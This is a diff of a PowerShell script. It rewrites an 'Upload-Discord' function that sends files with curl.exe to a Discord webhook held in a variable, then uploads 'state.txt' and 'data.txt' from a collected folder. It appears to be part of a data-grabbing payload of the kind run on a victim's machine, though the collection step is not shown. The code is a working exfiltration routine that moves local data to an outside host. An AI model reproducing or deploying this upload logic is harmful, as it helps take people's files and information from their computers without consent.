@@ -32,22 +32,25 @@ catch {
 ############################################################################
 function Upload-Discord {
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file
+    )
 
-$hookurl = "$dc"
+    $hookurl = "$dc"
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $hookurl
+    }
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$folderPath"}
+$stateFilePath = Join-Path -Path $folderPath -ChildPath "state.txt"
+$dataFilePath = Join-Path -Path $folderPath -ChildPath "data.txt"
 
-pause
+if (-not ([string]::IsNullOrEmpty($dc))){
+    Upload-Discord -file $stateFilePath
+    Upload-Discord -file $dataFilePath
+}
+
+Pause
